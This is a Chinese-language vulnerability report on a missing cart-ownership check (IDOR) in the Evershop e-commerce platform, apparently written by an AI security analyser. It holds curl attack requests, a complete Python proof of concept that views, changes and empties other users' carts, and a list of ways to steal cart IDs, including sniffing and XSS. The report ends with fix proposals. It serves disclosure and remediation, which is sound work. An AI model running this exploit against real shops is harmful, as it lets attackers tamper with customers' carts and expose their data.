# Evershop 购物车所有权未验证漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：不安全的直接对象引用 (IDOR, CWE-639) / 访问控制缺失 (CWE-284)
- **漏洞名称**：Evershop 购物车操作未验证所有权漏洞
- **风险等级**：中危
- **概述**：Evershop的购物车系统在多个操作中仅验证购物车UUID的存在性，而未验证当前请求者是否为购物车的所有者。攻击者可通过获取他人的购物车UUID，查看、修改或操作他人的购物车内容。

### 2.2 利用前提与特征

- **利用难度**：中
- **权限要求**：无（取决于具体API的访问控制）
- **操作条件**：
  1. 获取目标用户的购物车UUID
  2. 购物车处于有效状态
- **攻击特征**：使用他人的cart_id/uuid进行购物车操作

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **购物车内容泄露**：查看他人购物车中的商品
2. **购物车篡改**：修改他人购物车中的商品数量或删除商品
3. **隐私侵犯**：获知他人的购物偏好和意向
4. **业务干扰**：破坏他人的购物体验

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：分析购物车获取逻辑**

文件：`packages/evershop/src/modules/checkout/services/getCartByUUID.ts`
```typescript
export const getCartByUUID = async (uuid: string): Promise<Cart> => {
  const cart = await getCart(uuid);  // 仅按UUID查询
  return cart;
};
```

文件：`packages/evershop/src/modules/checkout/services/cart/Cart.js`
```javascript
async function getCart(uuid) {
  const cart = await select()
    .from('cart')
    .where('uuid', '=', uuid)  // 仅检查UUID
    .load(pool);

  if (!cart || cart.status !== true) {
    throw new Error('Cart not found');
  }
  // 未验证customer_id与当前用户匹配
}
```

**步骤2：分析购物车相关API**

购物车相关API通常只验证购物车存在性：
```javascript
// 典型的购物车操作Handler
const cart = await getCartByUUID(cart_id);
if (!cart) {
  return response.status(404).json({ error: 'Cart not found' });
}
// 直接操作购物车，未验证所有权
await addItemToCart(cart, item);
```

**步骤3：发送攻击请求**

```bash
# 获取他人购物车内容
curl -X GET 'https://target.com/api/cart/victim-cart-uuid'

# 修改他人购物车
curl -X POST 'https://target.com/api/cart/victim-cart-uuid/items' \
  -H 'Content-Type: application/json' \
  -d '{
    "product_id": "some-product",
    "quantity": 0
  }'

# 清空他人购物车
curl -X DELETE 'https://target.com/api/cart/victim-cart-uuid/items/item-id'
```

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 利用脚本

```python
#!/usr/bin/env python3
"""
Evershop Cart Ownership Bypass PoC
"""

import requests
import json

class CartManipulator:
    def __init__(self, target_url):
        self.target_url = target_url

    def get_cart_contents(self, cart_uuid):
        """
        获取购物车内容
        """
        endpoint = f"{self.target_url}/api/cart/{cart_uuid}"

        print(f"[*] 获取购物车: {cart_uuid}")

        response = requests.get(endpoint)

        if response.status_code == 200:
            data = response.json()
            print("[+] 购物车内容获取成功!")

            items = data.get('data', {}).get('items', [])
            print(f"    商品数量: {len(items)}")

            for item in items:
                print(f"    - {item.get('product_name')}: {item.get('quantity')} x ${item.get('price')}")

            return data
        else:
            print(f"[-] 获取失败: {response.status_code}")
            return None

    def modify_cart_item(self, cart_uuid, item_id, new_quantity):
        """
        修改购物车商品数量
        """
        endpoint = f"{self.target_url}/api/cart/{cart_uuid}/items/{item_id}"

        payload = {"quantity": new_quantity}

        print(f"[*] 修改商品数量: {item_id} -> {new_quantity}")

        response = requests.patch(endpoint, json=payload)

        if response.status_code == 200:
            print("[+] 修改成功!")
            return True
        else:
            print(f"[-] 修改失败: {response.status_code}")
            return False

    def delete_cart_item(self, cart_uuid, item_id):
        """
        删除购物车商品
        """
        endpoint = f"{self.target_url}/api/cart/{cart_uuid}/items/{item_id}"

        print(f"[*] 删除商品: {item_id}")

        response = requests.delete(endpoint)

        if response.status_code == 200:
            print("[+] 删除成功!")
            return True
        else:
            print(f"[-] 删除失败: {response.status_code}")
            return False

    def clear_cart(self, cart_uuid):
        """
        清空购物车
        """
        # 先获取所有商品
        cart = self.get_cart_contents(cart_uuid)
        if not cart:
            return False

        items = cart.get('data', {}).get('items', [])

        # 逐个删除
        for item in items:
            self.delete_cart_item(cart_uuid, item.get('uuid'))

        print(f"[+] 购物车已清空!")
        return True


def main():
    target = "https://shop.example.com"
    victim_cart = "victim-cart-uuid-here"

    manipulator = CartManipulator(target)

    print("=" * 60)
    print(" Cart Ownership Bypass PoC")
    print("=" * 60)
    print()

    # 1. 查看受害者购物车
    print("[*] 阶段1: 查看购物车内容")
    cart = manipulator.get_cart_contents(victim_cart)

    if cart:
        # 2. 篡改购物车
        print("\n[*] 阶段2: 篡改购物车")
        items = cart.get('data', {}).get('items', [])
        if items:
            # 将第一个商品数量改为0
            manipulator.modify_cart_item(victim_cart, items[0]['uuid'], 0)

        # 3. 清空购物车（可选的破坏性操作）
        # print("\n[*] 阶段3: 清空购物车")
        # manipulator.clear_cart(victim_cart)


if __name__ == "__main__":
    main()
```

### 4.2 购物车UUID获取方式

```python
def possible_cart_uuid_sources():
    """
    可能获取他人购物车UUID的方式
    """
    sources = [
        "1. 网络流量嗅探（中间人攻击）",
        "2. 浏览器本地存储泄露（XSS）",
        "3. 错误响应中的信息泄露",
        "4. URL参数泄露（Referer头）",
        "5. 共享链接功能",
        "6. 日志文件泄露",
        "7. 客户端存储备份（iCloud, Google备份等）",
    ]
    return sources
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│              购物车所有权验证缺失数据流                           │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  攻击者                            受害者                       │
│    │                                 │                         │
│    │                                 ▼                         │
│    │                          [创建购物车]                      │
│    │                          cart_uuid: "victim-cart"         │
│    │                          customer_id: 100                 │
│    │                                 │                         │
│    │      ┌──────────────────────────┘                         │
│    │      │ 通过某种方式获取cart_uuid                           │
│    ▼      ▼                                                    │
│  ┌───────────────────────────────────────────────────┐        │
│  │ GET/POST /api/cart/victim-cart                    │        │
│  └───────────────────────────────────────────────────┘        │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ getCartByUUID('victim-cart')            │                  │
│  │                                         │                  │
│  │ SELECT * FROM cart                      │                  │
│  │ WHERE uuid = 'victim-cart'              │  ← 仅验证UUID   │
│  │                                         │                  │
│  │ // 未检查:                              │                  │
│  │ // cart.customer_id === currentUser.id  │  ← 缺失!        │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ 返回购物车数据 / 执行操作               │                  │
│  │                                         │                  │
│  │ 攻击者可以:                             │                  │
│  │ - 查看购物车内容                         │                  │
│  │ - 修改商品数量                          │                  │
│  │ - 删除商品                              │                  │
│  │ - 添加商品                              │                  │
│  └─────────────────────────────────────────┘                  │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **仅验证存在性**：`getCartByUUID`只检查购物车是否存在
2. **无所有权检查**：未验证请求者与购物车`customer_id`的关联
3. **会话关联弱**：购物车与会话的绑定不够严格
4. **UUID作为唯一凭证**：将UUID视为访问令牌而非标识符

## 6. 修复建议

### 6.1 方案A：添加所有权验证

```typescript
// getCartByUUID.ts
export const getCartByUUID = async (
  uuid: string,
  customerId?: number
): Promise<Cart> => {
  const query = select()
    .from('cart')
    .where('uuid', '=', uuid)
    .and('status', '=', true);

  // 如果提供了customerId，验证所有权
  if (customerId !== undefined) {
    query.and('customer_id', '=', customerId);
  }

  const cart = await query.load(pool);

  if (!cart) {
    throw new Error('Cart not found or access denied');
  }

  return new Cart(cart);
};
```

### 6.2 方案B：会话绑定验证

```javascript
// 购物车API Handler
export default async (request, response, next) => {
  const cartUuid = request.params.cart_id;

  // 从会话获取购物车UUID
  const sessionCartUuid = request.session?.cartId;

  // 验证请求的购物车与会话匹配
  if (cartUuid !== sessionCartUuid) {
    // 如果用户已登录，检查购物车所有权
    const currentCustomer = request.getCurrentCustomer();
    if (currentCustomer) {
      const cart = await getCartByUUID(cartUuid, currentCustomer.customer_id);
      if (!cart) {
        return response.status(403).json({
          error: { message: 'Access denied to this cart' }
        });
      }
    } else {
      return response.status(403).json({
        error: { message: 'You can only access your own cart' }
      });
    }
  }

  // 继续处理
  next();
};
```

### 6.3 方案C：使用签名购物车ID

```javascript
import crypto from 'crypto';

function signCartId(cartUuid, secret) {
  const signature = crypto
    .createHmac('sha256', secret)
    .update(cartUuid)
    .digest('hex')
    .substring(0, 8);
  return `${cartUuid}.${signature}`;
}

function verifyCartId(signedCartId, secret) {
  const [uuid, signature] = signedCartId.split('.');
  const expectedSignature = crypto
    .createHmac('sha256', secret)
    .update(uuid)
    .digest('hex')
    .substring(0, 8);

  if (signature !== expectedSignature) {
    throw new Error('Invalid cart signature');
  }
  return uuid;
}
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
